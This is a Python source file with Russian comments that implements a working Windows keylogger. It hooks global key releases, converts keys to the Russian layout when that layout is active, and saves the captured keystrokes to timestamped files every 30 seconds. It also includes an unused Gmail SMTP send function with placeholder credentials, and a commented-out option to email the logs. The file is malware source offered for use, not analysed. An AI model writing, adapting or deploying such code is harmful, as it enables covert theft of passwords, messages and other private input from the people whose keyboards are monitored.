import keyboard
import smtplib  # для отправки электронной почты по протоколу SMTP (gmail)
# Таймер для запуска через заданный «интервал» времени.
from threading import Timer
from datetime import datetime

import ctypes

user32 = ctypes.WinDLL('user32', use_last_error=True)

SEND_REPORT_EVERY = 30  # время в секундах

EMAIL_ADDRESS = "some@gmail.com"
EMAIL_PASSWORD = "password"

KEYBOARD_LAYOUT = '''
qwertyuiop[]asdfghjkl;'zxcvbnm,./`1234567890-=
QWERTYUIOP{}ASDFGHJKL:"ZXCVBNM<>?~!@#$%^&*()_+
йцукенгшщзхъфывапролджэячсмитьбю.ё1234567890-=
ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,Ё!"№;%:?*()_+
'''.strip().split('\n')

KEY_LAY_DICT = dict()
for en_line in range(2):
    for symbol in range(len(KEYBOARD_LAYOUT[en_line])):
        KEY_LAY_DICT[KEYBOARD_LAYOUT[en_line][symbol]] = KEYBOARD_LAYOUT[en_line + 2][symbol]


def get_keyboard_language():
    """
    Gets the keyboard language in use by the current
    active window process.
    """
    # Get the current active window handle
    handle = user32.GetForegroundWindow()
    # Get the thread id from that window handle
    thread_id = user32.GetWindowThreadProcessId(handle, 0)
    # Get the keyboard layout id from the threadid
    layout_id = user32.GetKeyboardLayout(thread_id)
    # Extract the keyboard language id from the keyboard layout id
    language_id = layout_id & (2 ** 16 - 1)
    # Convert the keyboard language id from decimal to hexadecimal
    language_id_hex = hex(language_id)

    # Check if the hex value is in the dictionary.
    # if language_id_hex in languages.keys():
    #     return f'{languages[language_id_hex]} -> {language_id_hex}'
    # else:
    #     # Return language id hexadecimal value if not found.
    #     return str(language_id_hex)
    return str(language_id_hex)


def is_rus():
    lang_id = get_keyboard_language()  # 0x409 -> en; 0x419 -> ru
    if lang_id == '0x419':
        return True
    else:
        return False


def sendmail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message='hi'):
    # управляет подключением к SMTP-серверу
    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
    # подключиться к SMTP-серверу в режиме TLS
    server.starttls()
    # логин
    server.login(email, password)
    # отправить сообщение
    server.sendmail(email, email, message)
    # завершает сеанс
    server.quit()


class Keylogger:
    def __init__(self, interval):
        # передаем SEND_REPORT_EVERY в интервал
        self.interval = interval
        # это строковая переменная, которая содержит лог
        self.log = ""
        # запись начала и окончания даты и времени
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.filename = ''

    def callback(self, event):
        name = event.name
        type_ev = event.event_type
        print(f'{event}: {name}: {type_ev}')
        if len(name) == 1 and is_rus():
            name = KEY_LAY_DICT[name]

        if len(name) > 1:
            # Не символ, специальная клавиша (например, ctrl, alt и т. д.)
            # верхний регистр
            if name == "space":
                name = " "
            elif name == "enter":
                # добавлять новую строку всякий раз, когда нажимается ENTER
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:  # backspace, esc...
                # замените пробелы символами подчеркивания
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # добавить имя ключа в глобальную переменную

        self.log += name

    def update_filename(self):
        # создать имя файла, которое будет идентифицировано по дате начала и окончания записи
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            # записать лог
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            # обновить `self.filename`
            self.update_filename()
            self.report_to_file()

            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        # старт
        timer.start()

    def start(self):
        # записать дату и время начала
        self.start_dt = datetime.now()
        # запустить keylogger
        keyboard.on_release(callback=self.callback)
        # keyboard.hook(callback=self.callback)

        self.report()
        keyboard.wait()


if __name__ == "__main__":
    # для отправки по email раскомментировать строку ниже и закомментировать строку с report_method="file"
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
